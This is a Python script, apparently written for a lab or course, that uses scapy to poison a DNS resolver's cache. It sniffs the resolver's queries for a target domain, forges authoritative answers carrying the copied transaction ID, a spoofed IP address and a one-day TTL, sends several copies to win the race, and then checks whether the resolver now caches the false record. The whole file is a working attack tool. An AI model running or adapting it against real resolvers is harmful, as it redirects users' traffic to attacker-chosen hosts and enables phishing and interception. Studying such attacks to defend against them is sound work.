from scapy.all import *
from sys import argv
import time

# number of copies of the forged reply to fire per query, to win the race
COPIES = 3
# TTL in seconds (1 day), placed in the forged record, should be far larger than the legitimate 15s TTL so the cache is poisoned for a longer time
# after our exit
POISON_TTL = 86400

# normalize a DNS name
def norm(name):
    if isinstance(name, bytes):
        name = name.decode(errors="ignore")
    return name.rstrip(".").lower()

def main():
    if len(argv) != 4:
        print(f"Usage: python3 {argv[0]} <dns_server> <domain> <spoofed_ip>")
        exit(1)

    resolver, domain, spoofed_ip = argv[1], argv[2], argv[3]
    target = norm(domain)

    # network interface to listen to when sniffing from the resolver
    iface = conf.route.route(resolver)[0]
    conf.iface = iface

    # acting on packets that survived pkt_filter when sniffing,
    # accepts only DNS queries, not replies, from the resolver for the target domain and A record type
    def is_target_query(pkt):
        return (
            DNS in pkt and pkt[DNS].qr == 0
            and DNSQR in pkt and IP in pkt and pkt[IP].src == resolver
            and norm(pkt[DNSQR].qname) == target and pkt[DNSQR].qtype == 1
        )

    # we forge a packet going back to the resolver from the authoritative DNS server,
    # going back to the same port
    # we also copy the query's DNS transaction ID, mark it as a reply coming from an authoritative server (qr = 1, aa = 1), with recursion available (ra = 1),
    # and copy the original question section into the forged response, while setting a high caching TTL and spoofing the IP
    def forge_and_send(pkt):
        forged = (
            IP(src = pkt[IP].dst, dst = pkt[IP].src) /
            UDP(sport = pkt[UDP].dport, dport = pkt[UDP].sport) /
            DNS(
                id = pkt[DNS].id,
                qr = 1, aa = 1, rd = pkt[DNS].rd, ra = 1,
                qd = pkt[DNS].qd,
                ancount = 1,
                an = DNSRR(
                    rrname = pkt[DNSQR].qname,
                    type = "A",
                    rclass = "IN",
                    ttl = POISON_TTL,
                    rdata = spoofed_ip
                )
            )
        )
        for _ in range(COPIES):
            send(forged, verbose = False)
        print(f"INFO: Forged answer sent: {target} A {spoofed_ip} (ttl={POISON_TTL})")

    # we create a DNS query with recursion desired, asking for the target domain and send it to the resolver, searching for the existence of a forged
    # A record (domain name -> IPv4 address)
    def is_poisoned():
        q = (IP(dst = resolver) / UDP(sport = RandShort(), dport = 53) / DNS(rd = 1, qd = DNSQR(qname = domain, qtype = "A")))

        ans = sr1(q, timeout = 5, verbose = False)
        if ans and DNS in ans:
            for i in range(ans[DNS].ancount):
                rr = ans[DNS].an[i]
                if rr.type == 1 and str(rr.rdata) == spoofed_ip:
                    return True
        return False

    # 53 standard UDP port for DNS
    pkt_filter = f"udp and dst port 53 and src host {resolver}"
    print(f"INFO: waiting for the resolver {resolver} to query the authority.")

    while True:
        # discard unwanted packets, forge response and send upon arrival of a valid one, and stop each time to check if poisoning occurred
        sniff(
            filter = pkt_filter,
            iface = iface,
            lfilter = is_target_query,
            prn = forge_and_send,
            stop_filter = is_target_query,
            store = 0
        )

        # give the cache some time
        time.sleep(0.3)
        if is_poisoned():
            print(f"SUCCESS: resolver {resolver} now caches {target} -> {spoofed_ip}.")
            break
        else:
            print(f"WARNING: lost the race, waiting for the next query...")

    exit(0)

if __name__ == "__main__":
    main()
